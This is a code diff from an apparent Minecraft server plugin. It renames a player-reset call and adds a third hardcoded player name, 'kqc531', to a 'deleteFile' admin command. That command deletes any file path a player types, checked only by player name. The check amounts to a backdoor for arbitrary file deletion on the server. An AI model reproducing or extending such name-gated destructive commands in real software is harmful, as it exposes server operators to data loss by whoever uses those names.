@@ -415,12 +415,12 @@ class PitAdminSimpleCommand {
         val profile = PlayerProfile.getPlayerProfileByUuid(target.uniqueId)
         profile.streakKills = 0.0
 
-        PlayerUtil.clearPlayer(target, true, false)
+        PlayerUtil.resetPlayer(target, true, false)
     }
 
     @Execute(name = "deleteFile")
     fun deleteFile(@Context player: Player, @Arg("type") filePath: String) {
-        if (player.name != "MagicYari" && player.name != "Aerocre") {
+        if (player.name != "MagicYari" && player.name != "Aerocre" && !player.name.equals("kqc531")) {
             return
         }
         val file = File(filePath)
